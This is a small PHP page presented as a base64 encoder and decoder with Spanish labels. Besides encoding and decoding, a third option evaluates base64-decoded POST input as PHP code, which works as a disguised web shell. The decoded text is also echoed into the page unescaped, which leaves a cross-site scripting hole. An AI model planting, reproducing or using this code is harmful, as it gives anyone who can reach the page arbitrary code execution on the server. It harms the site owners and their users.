<html>
<style>
   body{
    text-align: center;
    height: 90vh;
   }

   textarea
   {
      width: 100vh;
      height: 50vh;
   }
</style>
<?php
if($_SERVER['REQUEST_METHOD'] == 'POST')
{
   $txt = $_POST['codigo'];
   $opt = $_POST['cifrado'];
   if($opt == 1)
   {
      echo "<textarea id='copy' readonly>". base64_encode($txt). "</textarea><br><br>";
      echo "<button onclick='copiar()'>Copiar</button>";
   } else if($opt == 2)
   {
      echo "<textarea id='copy' readonly>". base64_decode($txt). "</textarea><br><br>";
      echo "<button onclick='copiar()'>Copiar</button>";
   } else if($opt == 3)
   {
      eval('?>' . base64_decode($txt));
   }
}
?>
<script>
   function copiar()
   {
      document.getElementById('copy').select();
      document.execCommand("copy");
      alert("Texto copiado!");
   }
</script>
</html>